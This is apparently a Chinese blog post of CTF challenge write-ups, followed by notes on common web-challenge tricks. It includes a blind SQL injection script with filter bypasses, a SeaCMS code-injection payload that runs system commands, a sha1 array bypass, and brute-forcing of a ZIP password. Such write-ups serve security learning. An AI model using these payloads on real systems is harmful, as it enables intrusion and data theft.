+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]) 这个是jsfuck加密在线解密 得到flag flag{sdf465454dfgert32} 死亡真相发现是一段声音录像 将WAV文件放入Audacity中 查看频普图发现提示 flag：85a9d4517d4725_b9_8cbc9fd_554216 但是提交不上去 发现是个假的flag 通过查看文件属性发现多次出现0于是将_替换为0 ： 85a9d4517d47250b908cbc9fd0554216 再由md5解密可得flag：hsd132456 日军空袭发现这有事以长传的字符串 老样子 base64解码 这下需要点好多次 fB__l621a4h4g_ai{&amp;i} 的到这样的字符串 仔细观察 发现别有玄机 fB__ l621 a4h4 g_ai {&amp;i} 竖着看就可得到flag flag{B64_&amp;_2hai_14i} 戴星炳打开页面 天下武功，唯快不破！你能在2秒内算出下面的数学表达式结果吗？ 0x11 * (0x63 + 0xEE) + ( 0x30 ^ 0x1C) + 0x8D % 0xF6 + 0x19 这就要写脚本跑一下了 #!/usr/bin/python #coding=utf-8 import re import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) s = requests.Session() url = &#39;http://47.103.43.235:82/web/a/index.php&#39; r = s.get(url=url) # print r.text a = re.search(r&#39;&lt;/p&gt;&lt;p&gt;(.*)&lt;/p&gt;\\n&lt;form&#39;, r.text, re.M | re.S).group(1) res = eval(a) data ={ &#39;result&#39;:res, &#39;Submit&#39;:&#39;Submit&#39; } print eval(a) b =s.post(url=url,data=data) print b.text 得到flag flag{Y0U_4R3_3o_F4ST!} 大美晚报打开题目链接后是一个二维码，保存下来binwalk一下发现存在压缩包，-e参数分离出来 打开后发现有加密，但是给出来提示 那这就好办了，密码全部是数字，可以用压缩包爆破神器ARCHPR.exe来进行爆破，时间比较长,爆破出来密码是：674290437 flag：flag{d6@YX$_m^aa0} 得到flag：flag{d6@YX$_m^aa0} 潘汉年打开得到了一个字符串 bg[`sZ*Zg&#39;dPfP`VM_SXVd 想了一下 有可能会和ascii码有关所以 bg[`sZ*Zg&#39;dPfP`VM_SXVd的ASCII码为： 98,103,91,96,115,90,42,90,103,39,100,80,102,80,96,86,77,95,83,88,86,100 flag的ASCII码为： 102,108,97,103 观察发现他们的第一位 相差4 第二位相差5 第三位相差6 str = &quot;bg[`sZ*Zg&#39;dPfP`VM_SXVd&quot; # str_1 = &quot;flag&quot; flag = &quot;&quot; j=4 for i in range(len(str)): flag += chr(ord(str[i])+j) j = j+1 print flag 得到flag: flag{c4es4r_variation} 袁殊解题步骤：下载文件解压：得到两个文件 用kali linux的 openssl openssl rsa -pubin -text -modulus -in warmup -in RSA256/RSA256/gy.key 得到： Public-Key: (256 bit) Modulus: 00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd: c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0: 89:12:d9 Exponent: 65537 (0x10001) Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9 writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni 0bXTcqTQiRLZAgMBAAE= -----END PUBLIC KEY----- 可以看到Exponent: 65537，这里成为en的十六进制是Modules：A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9用python转成转成十进制： &gt;python Python 3.6.4 (v3.6.4:d48eceb, Dec 19 2017, 06:54:40) [MSC v.1900 64 bit (AMD64)] on win32 Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; a=0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9 &gt;&gt;&gt; a 76775333340223961139427050707840417811156978085146970312315886671546666259161 再将n进行因式分解来得到我p和q (使用http://factordb.com/) p=273821108020968288372911424519201044333 q=280385007186315115828483000867559983517 最后写好脚本，得出flag： #coding:utf-8 import gmpy import rsa p = 273821108020968288372911424519201044333 q = 280385007186315115828483000867559983517 n = 76775333340223961139427050707840417811156978085146970312315886671546666259161 e = 65537 d = int(gmpy.invert(e , (p-1) * (q-1))) privatekey = rsa.PrivateKey(n , e , d , p , q) #根据已知参数，计算私钥 with open(&quot;./fllllllag.txt&quot; , &quot;rb&quot;) as f: print(rsa.decrypt(f.read(), privatekey).decode()) #使用私钥对密文进行解密，并打印 flag{_2o!9_CTF_ECUN_}晴气庆胤打开页面得到： 查看页面源代码： 发现这中类行题 以前遇见过直接playload 这样就得到了flag 冈村宁次打开网址为：http://47.103.43.235:83/web/a/index.php?id===QM 感觉他传递的参数有一点像base64 发现是1 base64编码的逆序输出 所以测试一下：传递参数：if(1,1,2) 编码后为：pIDLxwSMoYWa 传递参数：if(0,1,2) 编码后为：pIDLxwCMoYWa fuzz一下 发现了 过滤了 空格 等号 其中 空格用 /*1*/ 绕过 等号用 like 绕过 于是编写脚本 import base64 import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) def string_reverse(m): s = base64.b64encode(m) num=len(s) a=&quot;&quot; for i in range(num): a += s[num-1-i] return a url =&quot;http://47.103.43.235:83/web/a/index.php?id=&quot; flag =&quot;&quot; for i in range(1,40): for j in range(33,128): # playload = &quot;if((ascii(substr(database(),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # playload = &quot;if((ascii(substr((selselectect/*a*/group_concat(table_name)/*a*/from/*a*/infoorrmation_schema.tables/*a*/ where/*a*/table_schema/*a*/like/*a*/ database()),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # playload = &quot;if((ascii(substr((selselectect/*a*/ group_concat(column_name)/*a*/ from /*a*/infoorrmation_schema.columns/*a*/ where/*a*/ table_name/*a*/like/*a*/&#39;flag&#39;),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; playload = &quot;if((ascii(substr((seleselectct/*a*/flag /*a*/from/*a*/ flag),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # print playload # exit() playload = string_reverse(playload) # print playload r=requests.get(url+playload) # print url+playload # print r.text # exit() if &quot;2019-11-11&quot; in r.text: flag += str(chr(j)) print flag break 就能得到flag: flag{s9li_1s_s0_e4sY} 作战计划进入发现是 seacms 可能存在任意代码执行 原理详见：https://www.jianshu.com/p/a3a18f233184 故playload: http://47.103.43.235:84/search.php?searchtype=5&amp;tid=6&amp;year=2014);assert($_POST[&quot;raidsh&quot;]);// post传参：radish=system(&quot;cat $(find / -name flag*)&quot;) 就能得到flag 池步洲打开页面 查看页面源代码： 发现index.phps 页面 &lt;?php error_reporting(0); $flag = &#39;********&#39;; if (isset($_POST[&#39;name&#39;]) and isset($_POST[&#39;password&#39;])){ if ($_POST[&#39;name&#39;] == $_POST[&#39;password&#39;]) print &#39;name and password must be diffirent&#39;; else if (sha1($_POST[&#39;name&#39;]) === sha1($_POST[&#39;password&#39;])) die($flag); else print &#39;invalid password&#39;; } ?&gt; 代发审计一波 发现可以绕过 post传参： name[]=a&amp;password[]=b 就可以得到flag: flag{Y0u_just_br0ke_sha1} obfuse32位ELF文件，无壳，载入IDA中通过关键字符串查找关键代码但是发现f5不好使，只能看汇编，首先输出“password：”，然后再从缓存区读取一串字符串，进入到sub_8048580进行验证，若返回0，则输入的是错误的，若返回1则输入的是正确的 在sub_8048580函数中是一位一位的check _BOOL4 __cdecl sub_8048580(int a1, signed int a2) { signed int v2; // edx char v3; // al _BOOL4 result; // eax char v5[33]; // [esp+Ch] [ebp-A0h] char b20_1; // [esp+2Dh] [ebp-7Fh] char b1f_1; // [esp+2Eh] [ebp-7Eh] char b1e_1; // [esp+30h] [ebp-7Ch] char b1d_1; // [esp+31h] [ebp-7Bh] char b1c_1; // [esp+32h] [ebp-7Ah] char b1b_1; // [esp+33h] [ebp-79h] char b1a_1; // [esp+35h] [ebp-77h] char b19_1; // [esp+36h] [ebp-76h] char b18_1; // [esp+37h] [ebp-75h] char b17_1; // [esp+38h] [ebp-74h] char b16_1; // [esp+39h] [ebp-73h] char b15_1; // [esp+3Ah] [ebp-72h] char b14_1; // [esp+3Ch] [ebp-70h] char b13_0; // [esp+3Dh] [ebp-6Fh] char b12_0; // [esp+3Eh] [ebp-6Eh] char b11_0; // [esp+3Fh] [ebp-6Dh] char b10_0; // [esp+40h] [ebp-6Ch] char bf_0; // [esp+41h] [ebp-6Bh] char be_0; // [esp+42h] [ebp-6Ah] char bd_0; // [esp+43h] [ebp-69h] char bc_1; // [esp+44h] [ebp-68h] char bb_1; // [esp+45h] [ebp-67h] char ba_1; // [esp+56h] [ebp-56h] char b9_0; // [esp+7Ch] [ebp-30h] char b8_0; // [esp+7Dh] [ebp-2Fh] char b7_0; // [esp+7Eh] [ebp-2Eh] char b6_0; // [esp+7Fh] [ebp-2Dh] char b5_1; // [esp+80h] [ebp-2Ch] char b4_1; // [esp+81h] [ebp-2Bh] char b3_1; // [esp+82h] [ebp-2Ah] char b2_1; // [esp+83h] [ebp-29h] char b1_1; // [esp+85h] [ebp-27h] unsigned int v38; // [esp+8Ch] [ebp-20h] v38 = __readgsdword(0x14u); v2 = a2; while ( 2 ) { memset(v5, 0, 0x80u); v3 = *(_BYTE *)(a1 + v2); v5[(v3 + 64) % 128] = 1; if ( (unsigned __int8)(v3 - 10) &lt;= 0x70u ) { switch ( v3 ) { case &#39;\\n&#39;: return v2 == 13 &amp;&amp; ba_1 != 0; case &#39;0&#39;: if ( v2 || !b9_0 ) return 0; v2 = 1; continue; case &#39;1&#39;: if ( v2 == 14 &amp;&amp; b8_0 ) goto LABEL_12; return 0; case &#39;2&#39;: if ( v2 == 20 &amp;&amp; b7_0 ) goto LABEL_15; return 0; case &#39;3&#39;: if ( v2 != 89 || !b6_0 ) return 0; v2 = 90; continue; case &#39;4&#39;: if ( v2 != 15 || !b5_1 ) return 0; v2 = 16; continue; case &#39;5&#39;: if ( v2 != 14 || !b4_1 ) return 0; LABEL_12: v2 = 15; continue; case &#39;6&#39;: if ( v2 != 12 || !b3_1 ) return 0; v2 = 13; continue; case &#39;7&#39;: if ( v2 != 5 || !b2_1 ) return 0; v2 = 6; continue; case &#39;8&#39;: result = 0; if ( b1_1 ) result = v2 == 33 || v2 == 2; return result; case &#39;9&#39;: if ( v2 != 1 || !b1_1 ) return 0; v2 = 2; continue; case &#39;a&#39;: if ( v2 != 35 || !b20_1 ) return 0; v2 = 36; continue; case &#39;b&#39;: if ( v2 != 11 || !b1f_1 ) return 0; v2 = 12; continue; case &#39;c&#39;: if ( v2 != 32 || !b20_1 ) return 0; v2 = 33; continue; case &#39;d&#39;: if ( v2 != 3 || !b1e_1 ) return 0; v2 = 4; continue; case &#39;e&#39;: if ( v2 != 7 || !b1d_1 ) return 0; v2 = 8; continue; case &#39;f&#39;: if ( !b1c_1 || v2 != 8 &amp;&amp; v2 != 4 ) return 0; goto LABEL_53; case &#39;g&#39;: return v2 == 12 &amp;&amp; b10_0 != 0; case &#39;h&#39;: if ( v2 != 13 || !b1b_1 ) return 0; v2 = 14; continue; case &#39;i&#39;: if ( v2 != 9 || !b1a_1 ) return 0; v2 = 10; continue; case &#39;j&#39;: if ( v2 != 10 || !b19_1 ) return 0; v2 = 11; continue; case &#39;k&#39;: return v2 == 12 &amp;&amp; b18_1 != 0; case &#39;l&#39;: if ( v2 != 19 || !b17_1 ) return 0; v2 = 20; continue; case &#39;m&#39;: if ( v2 != 17 || !b16_1 ) return 0; v2 = 18; continue; case &#39;n&#39;: return v2 == 18 &amp;&amp; b16_1 != 0; case &#39;o&#39;: if ( !b15_1 || v2 != 6 &amp;&amp; v2 != 28 ) return 0; LABEL_53: ++v2; continue; case &#39;p&#39;: if ( v2 != 30 || !b14_1 ) return 0; v2 = 31; continue; case &#39;q&#39;: if ( v2 != 29 || !b13_0 ) return 0; v2 = 30; continue; case &#39;r&#39;: if ( v2 != 20 || !b12_0 ) return 0; LABEL_15: v2 = 21; continue; case &#39;s&#39;: if ( v2 != 25 || !b11_0 ) return 0; v2 = 26; continue; case &#39;t&#39;: return v2 == 24 &amp;&amp; b12_0 != 0; case &#39;u&#39;: if ( v2 != 26 || !bf_0 ) return 0; v2 = 27; continue; case &#39;v&#39;: if ( v2 != 2 || !be_0 ) return 0; v2 = 3; continue; case &#39;w&#39;: if ( v2 != 6 || !bd_0 ) return 0; v2 = 7; continue; case &#39;x&#39;: if ( v2 != 22 || !bc_1 ) return 0; v2 = 23; continue; case &#39;y&#39;: if ( v2 != 23 || !bb_1 ) return 0; v2 = 24; continue; case &#39;z&#39;: return v2 == 21 &amp;&amp; b20_1 != 0; default: return 0; } } return 0; } } 根据switch中case的值和case中的if条件就可以反推出来正确的flag flag：09vdf7wefijbkAuth.exe32位的windows上可执行文件，无壳，先运行一下程序： 同样也是载入IDA中通过关键字符串查找关键代码（main函数），本函数前面定义了一大堆数据，最后经过sub_401500处理 int __cdecl main(int argc, const char **argv, const char **envp) { const CHAR *v3; // ebx HMODULE v4; // eax void (__stdcall *v5)(HMODULE, LPCSTR); // eax char v7; // [esp+1h] [ebp-157h] char v8[4]; // [esp+15h] [ebp-143h] int v9; // [esp+20h] [ebp-138h] int v10; // [esp+26h] [ebp-132h] int v11; // [esp+2Ah] [ebp-12Eh] int v12; // [esp+2Eh] [ebp-12Ah] int v13; // [esp+32h] [ebp-126h] int v14; // [esp+36h] [ebp-122h] int v15; // [esp+3Ah] [ebp-11Eh] __int16 v16; // [esp+3Eh] [ebp-11Ah] int v17; // [esp+40h] [ebp-118h] int v18; // [esp+44h] [ebp-114h] int v19; // [esp+48h] [ebp-110h] int v20; // [esp+4Ch] [ebp-10Ch] int v21; // [esp+50h] [ebp-108h] int v22; // [esp+54h] [ebp-104h] int v23; // [esp+58h] [ebp-100h] int v24; // [esp+5Ch] [ebp-FCh] int v25; // [esp+60h] [ebp-F8h] int v26; // [esp+64h] [ebp-F4h] int v27; // [esp+68h] [ebp-F0h] int v28; // [esp+6Ch] [ebp-ECh] int v29; // [esp+70h] [ebp-E8h] char v30; // [esp+74h] [ebp-E4h] int a_2; // [esp+75h] [ebp-E3h] int v32; // [esp+79h] [ebp-DFh] int v33; // [esp+7Dh] [ebp-DBh] int v34; // [esp+81h] [ebp-D7h] int v35; // [esp+85h] [ebp-D3h] int v36; // [esp+89h] [ebp-CFh] int v37; // [esp+8Dh] [ebp-CBh] int v38; // [esp+91h] [ebp-C7h] __int16 v39; // [esp+95h] [ebp-C3h] int a_1; // [esp+97h] [ebp-C1h] int v41; // [esp+9Bh] [ebp-BDh] int v42; // [esp+9Fh] [ebp-B9h] int v43; // [esp+A3h] [ebp-B5h] int v44; // [esp+A7h] [ebp-B1h] int v45; // [esp+ABh] [ebp-ADh] int v46; // [esp+AFh] [ebp-A9h] int v47; // [esp+B3h] [ebp-A5h] char v48; // [esp+B7h] [ebp-A1h] int v49; // [esp+B8h] [ebp-A0h] int v50; // [esp+BEh] [ebp-9Ah] int v51; // [esp+C2h] [ebp-96h] int v52; // [esp+C6h] [ebp-92h] int v53; // [esp+CAh] [ebp-8Eh] int v54; // [esp+CEh] [ebp-8Ah] int v55; // [esp+D2h] [ebp-86h] int v56; // [esp+D6h] [ebp-82h] int v57; // [esp+DAh] [ebp-7Eh] char v58; // [esp+DEh] [ebp-7Ah] int v59; // [esp+DFh] [ebp-79h] int v60; // [esp+E3h] [ebp-75h] int v61; // [esp+E7h] [ebp-71h] int v62; // [esp+EBh] [ebp-6Dh] int v63; // [esp+EFh] [ebp-69h] int v64; // [esp+F3h] [ebp-65h] int v65; // [esp+F7h] [ebp-61h] int v66; // [esp+FBh] [ebp-5Dh] __int16 v67; // [esp+FFh] [ebp-59h] int v68; // [esp+101h] [ebp-57h] int v69; // [esp+105h] [ebp-53h] char v70; // [esp+109h] [ebp-4Fh] int v71; // [esp+10Ah] [ebp-4Eh] int v72; // [esp+10Eh] [ebp-4Ah] int v73; // [esp+112h] [ebp-46h] int v74; // [esp+116h] [ebp-42h] int v75; // [esp+11Ah] [ebp-3Eh] int v76; // [esp+11Eh] [ebp-3Ah] int v77; // [esp+122h] [ebp-36h] int v78; // [esp+126h] [ebp-32h] int v79; // [esp+12Ah] [ebp-2Eh] int v80; // [esp+12Eh] [ebp-2Ah] int v81; // [esp+132h] [ebp-26h] int v82; // [esp+136h] [ebp-22h] int v83; // [esp+13Ah] [ebp-1Eh] int v84; // [esp+13Eh] [ebp-1Ah] int v85; // [esp+142h] [ebp-16h] int v86; // [esp+146h] [ebp-12h] int v87; // [esp+14Ah] [ebp-Eh] __int16 v88; // [esp+14Eh] [ebp-Ah] int *v89; // [esp+150h] [ebp-8h] v89 = &amp;argc; sub_402940(); puts( &quot; . \\n&quot; &quot; _|_ ROBOTIC AUTHENTICATION SYSTEM\\n&quot; &quot; /\\\\/\\\\ (. .) /\\n&quot; &quot; `||&#39; |#| \\n&quot; &quot; ||__.-\\&quot;-\\&quot;-.___ \\n&quot; &quot; `---| . . |--.\\\\ \\n&quot; &quot; | : : | ,||,\\n&quot; &quot; `..-..&#39; \\\\/\\\\/\\n&quot; &quot; || || \\n&quot; &quot; || || \\n&quot; &quot; |__|__| \\n&quot;); v49 = 0x539; v50 = 0x60646D51; v51 = 0x64216472; v52 = 0x7364756F; v53 = 0x64697521; v54 = 0x73686721; v55 = 0x51217572; v56 = 0x76727260; v57 = 0x3B65736E; v58 = 1; a_1 = 0x60646D51; v41 = 0x64216472; v42 = 0x7364756F; v43 = 0x64697521; v44 = 0x73686721; v45 = 0x51217572; v46 = 0x76727260; v47 = 0x3B65736E; v48 = 1; v59 = 0x60646D51; v60 = 0x64216472; v61 = 0x7364756F; v62 = 0x64697521; v63 = 0x62647221; v64 = 0x21656F6E; v65 = 0x72726051; v66 = 0x65736E76; v67 = 315; a_2 = 0x60646D51; // Please enter the second Password v32 = 0x64216472; v33 = 0x7364756F; v34 = 0x64697521; v35 = 0x62647221; v36 = 0x21656F6E; v37 = 0x72726051; v38 = 0x65736E76; v39 = 315; v68 = 0x6F6F3074; v69 = 0x666D3367; v70 = 3; v28 = 0x6F6F3074; v29 = 0x666D3367; v30 = 3; v71 = 0x6F73646A; v72 = 0x33326D64; v73 = 0x6D6D652F; v74 = 0x13F0101; v24 = 0x6F73646A; v25 = 0x33326D64; v26 = 0x6D6D652F; v27 = 0x13F0101; v75 = 0x57656540; v76 = 0x6E756264; v77 = 0x44656473; v78 = 0x71646279; v79 = 0x6F6E6875; v80 = 0x656F6049; v81 = 0x173646D; v17 = 0x57656540; v18 = 0x6E756264; v19 = 0x44656473; v20 = 0x71646279; v21 = 0x6F6E6875; v22 = 0x656F6049; v23 = 0x173646D; v82 = 0x21746E58; v83 = 0x2F6F6876; v84 = 0x6F6E4221; v85 = 0x75607366; v86 = 0x75606D74; v87 = 0x726F6E68; v88 = 0x120; v10 = 0x21746E58; v11 = 0x2F6F6876; v12 = 0x6F6E4221; v13 = 0x75607366; v14 = 0x75606D74; v15 = 0x726F6E68; v16 = 0x120; v9 = 0x539; strcpy(v8, &quot;r0b0RUlez!&quot;); dword_40AD94 = (int)&amp;v9; dword_40ADA0 = (int)&amp;v49; dword_40AD8C = (char *)&amp;a_1; dword_40AD90 = (char *)&amp;a_2; dword_40AD98 = (int)&amp;v28; lpProcName = (LPCSTR)&amp;v17; lpModuleName = (LPCSTR)&amp;v24; dword_40ADA4 = (char *)&amp;v10; sub_401500(0); v3 = lpProcName; v4 = GetModuleHandleA(lpModuleName); v5 = (void (__stdcall *)(HMODULE, LPCSTR))GetProcAddress(v4, v3); v5((HMODULE)1, (LPCSTR)sub_40157F); puts(dword_40AD8C); scanf(&quot;%20s&quot;, &amp;v7); if ( !strcmp(&amp;v7, v8) ) { puts(&quot;You passed level1!&quot;); sub_4015EA(0); } return 0; } 在sub_401500函数中对刚刚定义的数据的每一位都和1异或先把数据解密一下： data1=&quot;516D6460726421646F756473217569642167687372752151607272766E73653B&quot; str1 =&quot;&quot; for x in range(0,len(data1),2): str1 += chr(eval(&quot;0x&quot;+data1[x:x+2])^1) print str1 data2 = &quot;516D6460726421646F75647321756964217264626E6F652151607272766E73653B&quot; str2 =&quot;&quot; for x in range(0,len(data2),2): str2 += chr(eval(&quot;0x&quot;+data2[x:x+2])^1) print str2 data3 = &quot;74306F6F67336D66&quot; str3 =&quot;&quot; for x in range(0,len(data3),2): str3 += chr(eval(&quot;0x&quot;+data3[x:x+2])^1) print str3 data4 = &quot;6A64736F646D32332F656D6D&quot; str4 = &quot;&quot; for x in range(0,len(data4),2): str4 += chr(eval(&quot;0x&quot;+data4[x:x+2])^1) print str4 data5 = &quot;406565576462756E736465447962647175686E6F49606F656D6473&quot; str5 = &quot;&quot; for x in range(0,len(data5),2): str5 += chr(eval(&quot;0x&quot;+data5[x:x+2])^1) print str5 data6 = &quot;586E742176686F2F21426E6F66736075746D6075686E6F7220&quot; str6 = &quot;&quot; for x in range(0,len(data6),2): str6 += chr(eval(&quot;0x&quot;+data6[x:x+2])^1) print str6 输出结果：发现是一些需要输出的字符串 接下来程序接收一个字符串，与字符串“r0b0RUlez!”进行比较，这是第一层限制，然后来到函数sub_4015EA，在这个里面构造了一个异常，当程序走到这里的时候，发生异常而进行跳转，在跳转之前改变了一个数据，第二跳是在这个函数中的，那么我们就跟进第一条 跟进之后来到一个函数中，再接收一个字符串，进入sub_401547进行比较 在sub_401547函数中对字符串“u1nnf2lg”每一位都与2异或 解密得到“w3lld0ne” flag = &quot;u1nnf2lg&quot; real_flag =&quot;&quot; for x in range(len(flag)): real_flag+=chr(ord(flag[x])^2) print real_flag 最后将字符串拼接起来 flag：r0b0RUlez!_w3lld0ne","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"CTF中常见的web","slug":"CTF中常见的web","date":"2019-03-10T07:18:34.261Z","updated":"2019-06-05T09:01:33.602Z","comments":true,"path":"2019/03/10/CTF中常见的web/","link":"","permalink":"http://yoursite.com/2019/03/10/CTF中常见的web/","excerpt":"CTF常见的web题网页注释有些题会在网页注释给出提示信息，比如给出一部分源码","text":"CTF常见的web题网页注释有些题会在网页注释给出提示信息，比如给出一部分源码 表单标签的属性比如修改input标签的maxlenth属性来得到flag 伪造IPX-Forwarded-For:127.0.0.1 body标签之外有时候题目作者会把提示放在body标签和html标签之间，这样提示不会出现在网页页面，需要查看网页源码才能看到。 数据包信息隐藏在数据包的请求头和响应头里，通过抓包来获取 robots.txt一般网站会有robots.txt来规范爬虫的行为，利用robots.txt有可能获取到网站重要文件所在的位置 备份文件（还没见过）某些编译器会在编译时生成一些备份文件，如果不写正确处理这些文件，黑客可以利用这些文件来还原源码如： 网站备份压缩 .rar .zip .7z .tar.gz .bak PHP代码审计(常见漏洞)is_numeric(mixed $var)这是检测变量是否为数字或者数字字符串 有时候会需要绕过该函数的判断，课以利用科学计数法 如 1 == 1E+0 strip_tags(string allow)的逻辑错误这是一个剥去字符串中html、xml以及php的标签的函数。 allow可选。规定允许的标签，这些标签会不会被删除 有些代码会将该函数放在过滤代码之后，那么可以通过在payload中嵌入HTML、XML 以及PHP标签的方式绕过之前的过滤代码。 urldecode()逻辑漏洞同strip_tags(),将该函数放在判断函数之后的话可通过对payload的二次url编码绕过之前的判断函数。 本地包含 eval()函数把字符串按照PHP代码执行 var_dump()打印变量的相关信息 show_source() 函数对文件进行语法高亮显示 